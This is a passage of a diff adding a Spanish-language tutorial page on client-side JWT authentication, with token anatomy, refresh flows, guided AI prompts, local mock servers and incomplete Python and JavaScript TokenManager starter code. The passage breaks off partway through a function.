+                    <div class="operacional">🔧 <strong>Operacional:</strong> Crear no significa "generar código con IA". Significa tomar decisiones de diseño propias que la IA no tomó por ti.</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========== FASE 1: COMPRENDE ========== -->
+    <section id="comprende" class="fase-section">
+        <div class="fase-header comprende">
+            <div class="fase-icon">📖</div>
+            <div class="fase-info">
+                <h2>COMPRENDE — Anatomía del JWT y Flujo de Autenticación</h2>
+                <div class="bloom-tag">🎓 Bloom: Recordar · Comprender · Identificar con precisión</div>
+            </div>
+        </div>
+        <div class="fase-content">
+
+            <div class="objetivos-box">
+                <h4>🎯 Objetivos de esta fase</h4>
+                <ul>
+                    <li>Identificar las tres partes de un JWT y qué contiene cada una — sin memorizar la firma, sino entendiendo qué puede leer el cliente.</li>
+                    <li>Explicar el flujo completo de autenticación desde la perspectiva del cliente: desde el login hasta la petición autenticada, incluyendo el refresh.</li>
+                    <li>Reconocer los claims críticos desde el cliente: <code>exp</code>, <code>iat</code>, <code>sub</code>, <code>iss</code> — y su impacto en el comportamiento del cliente.</li>
+                    <li>Distinguir <em>verificar la firma</em> (responsabilidad del servidor) de <em>leer el payload</em> (capacidad del cliente).</li>
+                </ul>
+            </div>
+
+            <div class="contenido-section">
+                <h3>¿Qué es un JWT y qué puede ver el cliente?</h3>
+                <p>Un <strong>JSON Web Token (JWT)</strong> es un objeto de seguridad codificado en Base64URL, dividido en tres partes separadas por puntos (<code>.</code>). Es emitido por el servidor después de autenticar al usuario y entregado al cliente. Desde ese momento, el cliente es su custodio.</p>
+
+                <div class="jwt-visual">
+                    <div class="jwt-part header-part">
+                        <div class="part-label">Parte 1</div>
+                        <div class="part-title">HEADER</div>
+                        <div class="part-content">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</div>
+                    </div>
+                    <div class="jwt-separator">.</div>
+                    <div class="jwt-part payload-part">
+                        <div class="part-label">Parte 2</div>
+                        <div class="part-title">PAYLOAD</div>
+                        <div class="part-content">eyJzdWIiOiJ1c2VyXzEyMyIsImV4cCI6MTcxNDAwMDAwMH0</div>
+                    </div>
+                    <div class="jwt-separator">.</div>
+                    <div class="jwt-part signature-part">
+                        <div class="part-label">Parte 3</div>
+                        <div class="part-title">SIGNATURE</div>
+                        <div class="part-content">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</div>
+                    </div>
+                </div>
+
+                <table class="tabla-comparativa">
+                    <thead>
+                        <tr>
+                            <th>Parte</th>
+                            <th>Contenido decodificado</th>
+                            <th>¿Puede leerla el cliente?</th>
+                            <th>¿Para qué la usa el cliente?</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Header</strong></td>
+                            <td><code>{"alg":"HS256","typ":"JWT"}</code></td>
+                            <td>✅ Sí (Base64URL)</td>
+                            <td>Generalmente ignorado por el cliente — información del servidor</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Payload</strong></td>
+                            <td><code>{"sub":"user_123","exp":1714000000,"iat":1713999100,"role":"admin"}</code></td>
+                            <td>✅ Sí (Base64URL)</td>
+                            <td><strong>Leer <code>exp</code> para anticipar expiración</strong>; leer <code>sub</code> para mostrar nombre de usuario; leer <code>role</code> para mostrar/ocultar menús</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Signature</strong></td>
+                            <td>HMAC_SHA256(header + "." + payload, secret)</td>
+                            <td>⚠️ Puede leer los bytes, pero NO puede verificar</td>
+                            <td><strong>No hace nada con ella</strong> — la verificación es responsabilidad exclusiva del servidor. El cliente NUNCA verifica la firma.</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="context-box danger">
+                    <div class="box-title">🚨 Concepto crítico: el cliente NO verifica la firma</div>
+                    <p>El payload del JWT está en Base64URL — no cifrado. Cualquiera puede decodificarlo y leer su contenido. La seguridad NO viene de que el payload sea secreto, sino de que el servidor <strong>rechaza cualquier token con firma inválida</strong>. El cliente puede leer el payload libremente para extraer <code>exp</code> u otros claims, pero <strong>nunca debe tomar decisiones de seguridad solo basándose en lo que lee</strong> — el servidor es el árbitro final.</p>
+                </div>
+
+                <h3>Claims esenciales desde la perspectiva del cliente</h3>
+                <div class="ascii-diagram" role="img" aria-label="Diagrama: estructura de un payload JWT decodificado, mostrando los campos sub, email, role, iss, aud, iat y exp con anotaciones sobre para qué usa cada campo el cliente. La descripción textual aparece en el párrafo siguiente.">
+PAYLOAD DECODIFICADO — Lo que el cliente puede leer y usar:
+
+{
+  "sub":  "user_123",        ← Identificador del usuario (mostrar en UI)
+  "email":"ana@ecomarket.mx",← Datos del usuario (mostrar en UI)
+  "role": "operator",        ← Rol (mostrar/ocultar opciones de UI)
+  "iss":  "ecomarket-auth",  ← Emisor esperado (para debug, no para validar en cliente)
+  "aud":  "ecomarket-panel", ← Audiencia (para debug, no para validar en cliente)
+  "iat":  1713999100,        ← Emitido en (Unix timestamp)
+  "exp":  1714000000         ← Expira en (Unix timestamp) ← EL MÁS IMPORTANTE PARA EL CLIENTE
+}
+
+Cálculo de tiempo restante (desde el cliente):
+  ahora_unix = int(time.time())               # Python
+  tiempo_restante = exp - ahora_unix          # segundos hasta expiración
+  expira_en_5_min = tiempo_restante < 300     # umbral para refresh proactivo
+                </div>
+                <div class="diagrama-descripcion">
+                    <strong>Qué representa:</strong> el payload real de un JWT de EcoMarket con los claims más comunes. El claim <code>exp</code> es el único que el cliente usa activamente para gestionar el ciclo de vida del token — todos los demás son informativos para la UI. <strong>Simplifica:</strong> no muestra el header ni la firma, que el cliente ignora. <strong>Aspecto clave:</strong> la diferencia entre lo que el cliente <em>puede leer</em> y lo que el servidor <em>valida</em>.
+                </div>
+
+                <h3>Flujo completo de autenticación — perspectiva del cliente</h3>
+            </div>
+
+            <div class="context-box purple">
+                <div class="box-title">🛟 Cápsula de rescate — decodificando Base64URL en la práctica</div>
+                <p>Si la IA te genera código de decodificación que no funciona en tu entorno, aquí está la solución mínima probada para cada plataforma. El error más común es que las LLMs sugieren APIs de Node.js (<code>Buffer.from</code>) que no existen en el browser, o ignoran las diferencias de caracteres entre Base64 estándar y Base64URL:</p>
+                <pre style="background:#1e1e1e;color:#d4d4d4;padding:1rem;border-radius:6px;font-size:0.85rem;overflow-x:auto;margin-top:0.8rem;"><code># ── Python — dos líneas ──────────────────────────────────────────────
+import base64, json
+def _decode_b64url(part: str) -> dict:
+    # Base64URL → Base64 estándar: reemplazar - y _ , añadir padding
+    padded = part.replace('-', '+').replace('_', '/') + '==' * 2
+    return json.loads(base64.b64decode(padded))
+# Nota: base64.b64decode ignora padding sobrante, así que '==' extra es seguro.
+
+# ── JavaScript Browser — sin librerías externas ───────────────────────
+function decodeB64URL(part) {
+  // Paso 1: Base64URL → Base64 estándar
+  const b64 = part.replace(/-/g, '+').replace(/_/g, '/');
+  // Paso 2: Añadir padding hasta múltiplo de 4
+  const padded = b64 + '='.repeat((4 - b64.length % 4) % 4);
+  // Paso 3: Decodificar y parsear
+  return JSON.parse(atob(padded));
+  // ⚠️ atob() es browser-only. En Node.js usa Buffer.from(padded,'base64').toString()
+}</code></pre>
+                <p style="margin-top: 0.8rem; font-size: 0.9rem;"><em>Úsala si después de dos intentos con la IA el resultado sigue siendo incorrecto. Entenderla línea por línea sigue siendo tu responsabilidad — no la copies sin poder explicar qué hace el <code>% 4</code> y por qué el padding es necesario.</em></p>
+            </div>
+
+            <div class="ascii-diagram" role="img" aria-label="Diagrama de secuencia: flujo completo de autenticación JWT entre el cliente EcoMarket Panel y el Servidor Auth, mostrando los 5 escenarios: login, petición autenticada, refresh proactivo, refresh reactivo tras 401, y refresh fallido con logout. La descripción textual aparece en el párrafo siguiente.">
+
+1. LOGIN
+   ──────
+   POST /api/auth/login                ──────────────────────────────►
+   Body: {email, password}
+
+                                       ◄────────────────────────────── 200 OK
+                                       Body: {
+                                         access_token:  "eyJ...",  ← válido 15 min
+                                         refresh_token: "eyJ...",  ← válido 7 días
+                                         expires_in: 900           ← segundos
+                                       }
+
+   [TokenManager almacena ambos tokens]
+
+2. PETICIÓN AUTENTICADA (token vigente)
+   ─────────────────────────────────────
+   GET /api/ecomarket/precios           ──────────────────────────────►
+   Authorization: Bearer &lt;access_token&gt;
+
+                                       ◄────────────────────────────── 200 OK
+                                       Body: {precios: [...]}
+
+3. REFRESH PROACTIVO (faltando 5 min para expirar)
+   ─────────────────────────────────────────────────
+   POST /api/auth/refresh              ──────────────────────────────►
+   Body: {refresh_token: "eyJ..."}
+
+                                       ◄────────────────────────────── 200 OK
+                                       Body: {
+                                         access_token:  "eyJ... NUEVO",
+                                         expires_in: 900
+                                       }
+   [TokenManager reemplaza access_token]
+
+4. REFRESH REACTIVO (recibió 401)
+   ──────────────────────────────
+   GET /api/ecomarket/pedidos          ──────────────────────────────►
+   Authorization: Bearer &lt;access_token expirado&gt;
+
+                                       ◄────────────────────────────── 401 Unauthorized
+
+   POST /api/auth/refresh              ──────────────────────────────►
+   Body: {refresh_token: "eyJ..."}
+
+                                       ◄────────────────────────────── 200 OK
+   [TokenManager actualiza access_token]
+
+   GET /api/ecomarket/pedidos          ──────────────────────────────►
+   Authorization: Bearer &lt;access_token NUEVO&gt;
+
+                                       ◄────────────────────────────── 200 OK
+
+5. REFRESH FALLIDO (refresh_token expirado o revocado)
+   ─────────────────────────────────────────────────────
+   POST /api/auth/refresh              ──────────────────────────────►
+                                       ◄────────────────────────────── 401 Unauthorized
+
+   [TokenManager limpia tokens → redirige a Login]
+            </div>
+            <div class="diagrama-descripcion">
+                <strong>Qué representa:</strong> el ciclo de vida completo de autenticación visto exclusivamente desde el cliente, con los 5 escenarios que el TokenManager debe manejar. <strong>Simplifica:</strong> no muestra la validación de firma del servidor ni la lógica interna del sistema de auth. <strong>Aspecto clave:</strong> el cliente tiene dos estrategias — refresh <em>proactivo</em> (anticipa expiración leyendo <code>exp</code>) y refresh <em>reactivo</em> (responde a 401). El proactivo genera mejor experiencia de usuario.
+            </div>
+
+            <!-- RETO 1 -->
+            <div class="reto-ia">
+                <div class="reto-ia-header">
+                    <span class="reto-numero">1</span>
+                    <h4>Decoding manual: lee el payload de un JWT sin librería <span class="reto-badge esencial">Esencial</span></h4>
+                </div>
+                <div class="reto-ia-body">
+                    <div class="rol-ia"><strong>🤖 Rol de la IA:</strong> Instructor de seguridad que explica qué puede ver el cliente en un token — sin tecnicismos innecesarios, con analogías concretas.</div>
+                    <div class="prompt-box">Explica de forma simple, usando analogías cotidianas (como una credencial de visitante de hospital que tiene tu foto, nombre y fecha de vencimiento impresos — cualquiera puede leer esos datos, pero solo el sistema del hospital puede verificar que la credencial no fue falsificada) antes de entrar en detalles técnicos. Usa lenguaje de estudiante de segundo-tercer semestre.
+
+Actúa como instructor de seguridad en sistemas distribuidos.
+
+Tengo este JWT de EcoMarket que acabo de recibir al hacer login:
+
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzQ1NiIsImVtYWlsIjoiYW5hQGVjb21hcmtldC5teCIsInJvbGUiOiJvcGVyYXRvciIsImV4cCI6MTcxNDAwMDAwMCwiaWF0IjoxNzEzOTk5MTAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+Necesito entender cómo mi código cliente puede leer el claim exp para anticipar la expiración. Guíame paso a paso en estos puntos — espera mi respuesta antes de continuar al siguiente:
+
+1. ¿Cómo separo las tres partes del JWT en mi código? Muéstrame la línea de código en Python Y en JavaScript (navegador). Solo la línea de separación, nada más.
+   → Después de que yo intente escribirla, corrígeme si algo está mal.
+
+2. ¿Por qué la segunda parte (payload) usa Base64URL y no Base64 normal? ¿Qué tiene de diferente? ¿Cómo afecta eso a cómo lo decodifico en mi código?
+   → Espera que yo intente explicarlo antes de completar mi respuesta.
+
+3. Muéstrame cómo calcular en mi código si el token expirará en menos de 5 minutos, usando el campo exp del payload decodificado. ¿Qué unidad de tiempo usa el campo exp?
+   → Primero déjame intentar escribir la condición, luego corrígeme.
+
+Si en algún momento me das la respuesta completa antes de que yo intente, recuérdame que use la frase: "Espera — dame un momento para intentarlo primero".</div>
+                    <div class="entregable-box">
+                        Función <code>decode_payload(token)</code> en tu lenguaje elegido que: (1) extrae el payload sin librería JWT, (2) devuelve el dict/objeto con los claims, (3) calcula e imprime el tiempo restante hasta expiración en minutos. Incluye un comentario que explique por qué el cliente puede hacer esto sin verificar la firma.
+                    </div>
+                </div>
+            </div>
+
+            <!-- RETO 2 -->
+            <div class="reto-ia">
+                <div class="reto-ia-header">
+                    <span class="reto-numero">2</span>
+                    <h4>Diagrama del flujo de autenticación desde tu código <span class="reto-badge esencial">Esencial</span></h4>
+                </div>
+                <div class="reto-ia-body">
+                    <div class="rol-ia"><strong>🤖 Rol de la IA:</strong> Arquitecto de clientes distribuidos que ayuda a trazar el flujo de estados del cliente durante la autenticación.</div>
+                    <div class="prompt-box">Actúa como arquitecto de software especialista en código cliente.
+
+Antes de implementar cualquier código, necesito entender el flujo de estados de mi cliente durante la autenticación con JWT. Ayúdame a pensar en esto como una máquina de estados del cliente — no del servidor.
+
+Hazlo en este orden, uno por uno, esperando mi propuesta antes de continuar:
+
+1. ESTADOS DEL CLIENTE: ¿Cuántos estados distintos puede tener mi cliente respecto a la autenticación? Propón los nombres de los estados. Yo los propondré primero y tú me corriges o mejoras.
+   → Pista: piensa en qué puede hacer el cliente en cada estado (hacer peticiones autenticadas, esperar, reintentar, redirigir al login).
+
+2. TRANSICIONES: Para cada par de estados, ¿qué evento hace que el cliente cambie de estado?
+   Ejemplos de eventos: "usuario envía credenciales", "servidor responde 200 al login", "servidor responde 401", "exp ≤ 5 min detectado en timer", "refresh exitoso", "refresh fallido".
+   → Dame el número de transiciones que esperas. Yo intentaré dibujarlas primero en texto plano.
+
+3. ACCIONES EN CADA TRANSICIÓN: En cada cambio de estado, ¿qué hace concretamente el código del cliente? (almacenar token, adjuntar header, cancelar timer anterior, limpiar storage, redirigir).
+   → Identifica la transición más compleja del flujo — ¿cuál crees que es y por qué?
+
+No generes código todavía. El objetivo de este reto es que yo pueda describir el flujo completo con mis propias palabras antes de implementarlo.</div>
+                    <div class="entregable-box">
+                        Diagrama de estados del cliente en texto o ASCII (mínimo 4 estados, mínimo 6 transiciones) con el nombre de cada evento que dispara la transición y la acción que ejecuta el cliente. Este diagrama será tu guía de implementación en la fase APLICA.
+                    </div>
+                </div>
+            </div>
+
+            <div class="checkpoint">
+                <h4>🧠 Checkpoint Metacognitivo — COMPRENDE</h4>
+                <div class="pregunta">Si tienes el JWT guardado en memoria, ¿puedes decirle a la IA el valor de <code>exp</code> de tu token de prueba y calcular el tiempo restante <em>sin pedirle que lo haga por ti</em>? Si no puedes, vuelve al Reto 1 — la fase APLICA depende de ese cálculo.</div>
+                <div class="pregunta">Sin mirar el diagrama de esta página, ¿puedes explicar con tus propias palabras la diferencia entre refresh proactivo y refresh reactivo? ¿En qué situación usarías cada uno?</div>
+                <div class="pregunta">¿Podrías detectar si la IA te está explicando cómo implementar la verificación de firma en el cliente? Ese sería un error de diseño — el cliente <em>nunca</em> verifica la firma. Si la IA propone eso, ¿qué le dirías?</div>
+            </div>
+
+            <div class="invariantes-box">
+                <h4>🔒 Invariantes que no deben romperse — COMPRENDE</h4>
+                <ul>
+                    <li>El payload del JWT <strong>no está cifrado</strong> — está codificado en Base64URL. Nunca almacenes datos sensibles (contraseñas, números de tarjeta) en el payload esperando que estén ocultos.</li>
+                    <li>El cliente <strong>nunca verifica la firma</strong> del JWT. Si la IA te propone implementar HMAC o RSA en el cliente, está dando una solución incorrecta.</li>
+                    <li>El campo <code>exp</code> usa <strong>Unix timestamp en segundos</strong> (no milisegundos). Un error de unidades hace que el cliente piense que el token expira en 1970 o en el año 2527.</li>
+                    <li>Un JWT de 15 minutos no significa que el usuario deba re-autenticarse cada 15 minutos — el <strong>refresh_token</strong> (7 días) permite renovar el access_token sin credenciales. Son dos tokens con propósitos distintos.</li>
+                    <li>Leer el claim <code>role</code> del JWT para mostrar/ocultar elementos de UI está bien. Usar ese claim para <strong>tomar decisiones de autorización</strong> en el cliente (ej: "el usuario es admin, así que proceso la solicitud") es incorrecto — el servidor es el árbitro de autorización.</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========== FASE 2: APLICA ========== -->
+    <section id="aplica" class="fase-section">
+        <div class="fase-header aplica">
+            <div class="fase-icon">⚡</div>
+            <div class="fase-info">
+                <h2>APLICA — Construyendo el TokenManager</h2>
+                <div class="bloom-tag">🎓 Bloom: Aplicar · Analizar · Tomar decisiones de implementación</div>
+            </div>
+        </div>
+        <div class="fase-content">
+
+            <div class="objetivos-box">
+                <h4>🎯 Objetivos de esta fase</h4>
+                <ul>
+                    <li>Implementar la clase <code>TokenManager</code> con almacenamiento, lectura de <code>exp</code>, refresh proactivo y refresh singleton.</li>
+                    <li>Construir un interceptor HTTP que adjunta el <code>Authorization: Bearer</code> header a cada petición autenticada, transparente para el resto del código.</li>
+                    <li>Decidir — con criterio de seguridad — dónde almacenar el access_token y el refresh_token en tu plataforma elegida.</li>
+                    <li>Analizar qué decisiones de implementación tu lenguaje te obliga a tomar (manejo de concurrencia, tipos de errores, gestión de timers).</li>
+                </ul>
+            </div>
+
+            <div class="context-box info">
+                <div class="box-title">💻 Lenguaje sugerido por ruta — ¿por qué importa la elección?</div>
+                <p><strong>Ruta Python (terminal/servicio):</strong> <code>requests.Session</code> te da hooks (<code>hooks['response']</code>) para interceptar cada respuesta y disparar el refresh en 401. El manejo de concurrencia con <code>asyncio.Lock</code> hace visible el patrón singleton. Aprenderás cómo un <em>objeto de sesión</em> encapsula estado persistente entre peticiones.</p>
+                <p style="margin-top: 0.8rem;"><strong>Ruta Browser (JavaScript):</strong> Un wrapper sobre <code>fetch()</code> o un <em>request interceptor</em> demuestra el patrón Decorator — añades comportamiento (adjuntar token, manejar 401) sin modificar el código que llama a la API. El almacenamiento en memoria (variable de módulo) vs. <code>sessionStorage</code> tiene implicaciones reales de seguridad que analizarás en REFLEXIONA.</p>
+            </div>
+
+            <div class="errores-comunes">
+                <h4>⚠️ Errores comunes esta semana</h4>
+                <div class="error-item">
+                    <strong>Error 1: Confundir `exp` en segundos con milisegundos.</strong> <code>Date.now()</code> en JavaScript devuelve milisegundos; <code>time.time()</code> en Python devuelve segundos (float). El claim <code>exp</code> del JWT siempre está en segundos Unix. Comparar <code>Date.now()</code> directamente con <code>exp</code> hace que el token parezca que expira en el año 2527 o que ya expiró en 1970.
+                </div>
+                <div class="error-item">
+                    <strong>Error 2: Múltiples refresh simultáneos — el "thundering herd" de tokens.</strong> Si 5 peticiones concurrentes reciben 401 al mismo tiempo, sin protección singleton dispararán 5 llamadas a <code>/api/auth/refresh</code>. Muchos servidores invalidan el refresh_token al primer uso (rotación de tokens) — las 4 peticiones restantes fallarán con 401, forzando logout. La solución es un flag o un Promise/Future compartido.
+                </div>
+                <div class="error-item">
+                    <strong>Error 3: Almacenar el refresh_token en localStorage sin considerar XSS.</strong> Un script malicioso inyectado en la página puede leer <code>localStorage</code> completo. El access_token en memoria (variable de módulo JS) limita la ventana de ataque a 15 minutos. El refresh_token es el token de mayor valor — su almacenamiento merece la mayor protección.
+                </div>
+                <div class="error-item">
+                    <strong>Error 4: No limpiar el timer de refresh proactivo al hacer logout.</strong> Si el usuario cierra sesión pero el <code>setInterval</code>/<code>asyncio.create_task</code> del refresh sigue corriendo, intentará hacer refresh con tokens ya eliminados — generando errores silenciosos o, peor, conservando el token activo en memoria después del logout.
+                </div>
+            </div>
+
+            <!-- Starter code para ambas rutas -->
+            <div class="contenido-section">
+                <h3>Código Base (Starter Code)</h3>
+                <p>El siguiente código está intencionalmente <strong>incompleto</strong> — tiene los métodos definidos pero con lógica por implementar. Es tu punto de partida para el Reto 3. <em>Adáptalo al lenguaje de tu ruta.</em></p>
+            </div>
+
+            <div class="context-box tip">
+                <div class="box-title">🧪 Mock de endpoints — prueba sin servidor real</div>
+                <p>La URL <code>https://api.ecomarket.mx</code> no existe en producción para este curso. Usa los siguientes mocks locales para poder ejecutar y probar tu TokenManager sin depender de un backend real.</p>
+
+                <p style="margin-top: 0.8rem;"><strong>🐍 Ruta Python — mock con aiohttp.web o función stub:</strong></p>
+                <pre style="background:#1e1e1e;color:#d4d4d4;padding:1rem;border-radius:6px;font-size:0.85rem;overflow-x:auto;margin-top:0.5rem;"><code># mock_auth.py — Servidor mock mínimo (ejecutar en otra terminal)
+from aiohttp import web
+import json, time
+
+# access_token con exp = ahora + 900 seg (válido 15 min desde que arranca el mock)
+MOCK_ACCESS = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." \
+              "eyJzdWIiOiJ1c2VyXzEiLCJleHAiOjk5OTk5OTk5OTksImlhdCI6MTcxNDAwMH0." \
+              "firma_simulada"
+MOCK_REFRESH = "refresh_token_simulado_ecomarket"
+
+async def handle_login(req):
+    return web.json_response({
+        "access_token": MOCK_ACCESS,
+        "refresh_token": MOCK_REFRESH,
+        "expires_in": 900
+    })
+
+async def handle_refresh(req):
+    body = await req.json()
+    if body.get("refresh_token") == MOCK_REFRESH:
+        return web.json_response({"access_token": MOCK_ACCESS, "expires_in": 900})
+    return web.Response(status=401, text="refresh_token inválido")
+
+app = web.Application()
+app.router.add_post("/api/auth/login", handle_login)
+app.router.add_post("/api/auth/refresh", handle_refresh)
+
+if __name__ == "__main__":
+    web.run_app(app, port=8080)
+    # Ejecutar: python mock_auth.py
+    # Tu TokenManager apunta a: http://localhost:8080/api/auth/refresh</code></pre>
+
+                <p style="margin-top: 1rem;"><strong>🌐 Ruta Browser — mock con función JS inline (sin servidor):</strong></p>
+                <pre style="background:#1e1e1e;color:#d4d4d4;padding:1rem;border-radius:6px;font-size:0.85rem;overflow-x:auto;margin-top:0.5rem;"><code>// mockFetch.js — Reemplaza fetch() durante pruebas locales
+// Pega esto antes de tu tokenManager.js en el HTML de prueba
+
+// access_token con exp = año 2286 (nunca expira en pruebas)
+const MOCK_ACCESS_TOKEN =
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" +
+  ".eyJzdWIiOiJ1c2VyXzEiLCJleHAiOjk5OTk5OTk5OTksImlhdCI6MTcxNDAwMH0" +
+  ".firma_simulada";
+
+// Para probar expiración: payload con exp = 1700000000 (año 2023, ya expirado)
+const MOCK_EXPIRED_TOKEN =
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" +
+  ".eyJzdWIiOiJ1c2VyXzIiLCJleHAiOjE3MDAwMDAwMDAsImlhdCI6MTcwMDAwMDAwMH0" +
+  ".firma_simulada";
+
+let mockRefreshCount = 0;  // Contador para verificar el singleton (Caso 6)
+
+const originalFetch = window.fetch;
+window.fetch = async (url, options = {}) => {
+  if (url.includes("/api/auth/login")) {
+    return { ok: true, json: async () => ({
+      access_token: MOCK_ACCESS_TOKEN,
+      expires_in: 900
+      // El refresh_token llega en cookie HttpOnly — el mock no lo simula en JS
+    })};
+  }
+  if (url.includes("/api/auth/refresh")) {
+    mockRefreshCount++;
+    console.log(`[mock] Llamada #${mockRefreshCount} al endpoint de refresh`);
+    // Cambiar a return {ok:false, status:401} para simular refresh fallido
+    return { ok: true, json: async () => ({ access_token: MOCK_ACCESS_TOKEN, expires_in: 900 })};
+  }
+  if (url.includes("/api/ecomarket")) {
+    const auth = (options.headers || {})["Authorization"] || "";
+    if (!auth.startsWith("Bearer ")) return { ok: false, status: 401 };
+    return { ok: true, json: async () => ({ datos: "respuesta simulada de EcoMarket" })};
+  }
+  return originalFetch(url, options);
+};</code></pre>
+                <p style="margin-top: 0.8rem; font-size: 0.9rem;"><em>Para simular un 401 en el endpoint de recursos (y forzar el flujo de refresh reactivo), cambia el mock de <code>/api/ecomarket</code> para que siempre devuelva <code>status: 401</code> en la primera llamada y <code>ok: true</code> en la segunda.</em></p>
+            </div>
+
+            <div class="context-box danger">
+                <div class="box-title">⚠️ Ruta Browser: decisión de arquitectura que afecta al starter code</div>
+                <p>Antes de leer el código, elige cómo tu cliente manejará el <code>refresh_token</code>. Esta elección cambia lo que tu JavaScript necesita hacer:</p>
+                <ul style="margin: 0.5rem 0 0.5rem 1.5rem;">
+                    <li><strong>Sub-ruta A — refresh_token en memoria JS:</strong> más simple de implementar, pero expuesto a XSS durante su vida útil (7 días). El código almacena el refresh_token en una variable del módulo y lo envía en el body del POST <code>/api/auth/refresh</code>.</li>
+                    <li><strong>Sub-ruta B — refresh_token en cookie HttpOnly (recomendada):</strong> el servidor emite el refresh_token directamente como cookie HttpOnly — tu JavaScript <em>nunca lo ve, nunca lo lee, nunca lo envía manualmente</em>. Para renovar el token, el cliente hace <code>fetch('/api/auth/refresh', { credentials: 'include' })</code> y el navegador adjunta la cookie automáticamente. Esto elimina el vector XSS para el token de mayor valor.</li>
+                </ul>
+                <p><strong>El starter code JS de abajo implementa la Sub-ruta B (HttpOnly).</strong> Si tu servidor de práctica no soporta cookies HttpOnly aún, usa la Sub-ruta A temporalmente — pero documenta en tu bitácora de decisiones por qué B es preferible en producción.</p>
+            </div>
+
+            <div class="ruta-tabs">
+                <button class="ruta-tab python active" data-tab-grupo="starter" data-tab-id="ruta-python" onclick="showRuta('starter','ruta-python')">🐍 Ruta Python</button>
+                <button class="ruta-tab browser" data-tab-grupo="starter" data-tab-id="ruta-browser" onclick="showRuta('starter','ruta-browser')">🌐 Ruta Browser (JS)</button>
+            </div>
+
+            <div id="ruta-python" class="ruta-content active" data-ruta-grupo="starter">
+                <pre><code>import asyncio
+import time
+import base64
+import json
+from typing import Optional
+
+class TokenManager:
+    """
+    Gestiona el ciclo de vida de los JWT del cliente EcoMarket.
+
+    Responsabilidades:
+    - Almacenar access_token y refresh_token en memoria (nunca en disco en esta implementación)
+    - Proveer el access_token vigente, renovándolo si es necesario
+    - Refresh singleton: si ya hay un refresh en curso, otras corrutinas esperan su resultado
+    - Limpiar el estado al hacer logout
+
+    PARA EL ESTUDIANTE: Adapta esta clase a tu lenguaje si usas Java, C# u otro.
+    Los principios son los mismos; el mecanismo de lock/mutex cambia según el lenguaje.
+    """
+
+    def __init__(self):
+        self._access_token: Optional[str] = None
+        self._refresh_token: Optional[str] = None
+        self._refresh_lock = asyncio.Lock()  # Singleton guard
+        self._refresh_endpoint = "https://api.ecomarket.mx/api/auth/refresh"
+
+    def decode_payload(self, token: str) -> dict:
+        """Decodifica el payload de un JWT sin verificar firma.
+        Retorna el dict de claims. Lanza ValueError si el token está malformado."""
+        # TODO: Implementar
+        # Pista: token.split('.') → tomar parte [1] → Base64URL decode → json.loads
+        raise NotImplementedError("Implementa decode_payload en el Reto 3")
+
+    def is_expiring_soon(self, margin_seconds: int = 300) -> bool:
+        """Retorna True si el access_token expirará en menos de margin_seconds segundos."""
+        # TODO: Implementar usando decode_payload y time.time()
+        raise NotImplementedError("Implementa is_expiring_soon en el Reto 3")
+
+    def store_tokens(self, access_token: str, refresh_token: str) -> None:
+        """Almacena los tokens recibidos del servidor al hacer login o refresh."""
+        # TODO: Implementar
+        raise NotImplementedError("Implementa store_tokens en el Reto 3")
+
+    def get_auth_header(self) -> dict:
+        """Retorna el header Authorization listo para adjuntar a una petición."""
+        # TODO: Implementar
+        # Formato esperado: {"Authorization": "Bearer &lt;access_token&gt;"}
+        raise NotImplementedError("Implementa get_auth_header en el Reto 3")
+
+    async def refresh_access_token(self) -> bool:
+        """Realiza el refresh del access_token usando el refresh_token.
+        Usa _refresh_lock para garantizar que solo haya un refresh activo a la vez.
+        Retorna True si el refresh fue exitoso, False si falló (requiere logout)."""
+        # TODO: Implementar el patrón singleton con async with self._refresh_lock
+        # Dentro del lock: hacer POST a _refresh_endpoint, actualizar _access_token
+        raise NotImplementedError("Implementa refresh_access_token en el Reto 3")
+
+    def logout(self) -> None:
+        """Limpia todos los tokens del estado del cliente."""
+        # TODO: Implementar — recuerda cancelar cualquier timer de refresh proactivo
+        raise NotImplementedError("Implementa logout en el Reto 3")</code></pre>
+            </div>
+
+            <div id="ruta-browser" class="ruta-content" data-ruta-grupo="starter">
+                <pre><code>// tokenManager.js — Módulo singleton para el cliente del panel EcoMarket
+// ARQUITECTURA: Sub-ruta B — refresh_token en cookie HttpOnly
+//   El servidor emite el refresh_token como cookie HttpOnly al hacer login.
+//   Este módulo NUNCA almacena, lee ni envía el refresh_token en código JS.
+//   El navegador lo adjunta automáticamente con credentials:'include'.
+//   → Resultado: el vector XSS no puede robar el token de mayor valor.
+
+const TokenManager = (() => {
+  // Estado interno — solo el access_token vive en memoria JS
+  let _accessToken = null;      // Válido 15 min; se pierde al recargar (correcto)
+  // _refreshToken NO existe: vive en cookie HttpOnly, invisible para JS
+  let _isRefreshing = false;
+  let _refreshQueue = [];       // Cola de resolvers que esperan el refresh en curso
+  const REFRESH_ENDPOINT = "/api/auth/refresh";
+  const EXPIRY_MARGIN_SEC = 300; // Renovar si faltan < 5 minutos
+
+  /**
+   * Decodifica el payload de un JWT sin verificar firma.
+   * PARA EL ESTUDIANTE: Adapta esta función a tu lenguaje si usas Python, Java, etc.
+   * El principio es el mismo: split('.'), tomar [1], base64url-decode, JSON.parse.
+   *
+   * 💡 Cápsula de rescate — padding de Base64URL en browser:
+   *   const raw = part.replace(/-/g, '+').replace(/_/g, '/');
+   *   const padded = raw + '='.repeat((4 - raw.length % 4) % 4);
+   *   return JSON.parse(atob(padded));
+   */
+  function _decodePayload(token) {
+    // TODO: Implementar
+    // Paso 1: split('.') y verificar que haya exactamente 3 partes
+    // Paso 2: tomar parts[1], reemplazar - por + y _ por / (Base64URL → Base64)
+    // Paso 3: añadir padding '=' hasta que la longitud sea múltiplo de 4
